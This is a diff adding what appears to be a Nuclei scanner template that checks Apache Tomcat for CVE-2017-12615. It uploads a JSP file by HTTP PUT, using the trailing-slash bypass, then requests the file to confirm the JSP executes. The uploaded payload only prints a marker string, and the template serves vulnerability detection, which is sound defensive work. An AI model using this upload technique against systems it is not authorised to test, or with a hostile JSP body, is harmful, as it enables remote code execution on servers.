@@ -1,0 +1,40 @@
+id: tomcat-cve-2017-12615-put-risk-check
+
+info:
+  name: Apache Tomcat CVE-2017-12615 PUT Risk Check
+  author: local
+  severity: high
+  description: |
+    Attempts to upload a harmless JSP marker using HTTP PUT and then
+    requests it back to verify whether upload/execution behavior is enabled.
+  tags: tomcat,cve-2017-12615,put,risk
+
+variables:
+  filename: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        PUT /{{filename}}.jsp/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        <% out.println("OAI_TOMCAT_PUT_OK"); %>
+
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    cookie-reuse: true
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "OAI_TOMCAT_PUT_OK"
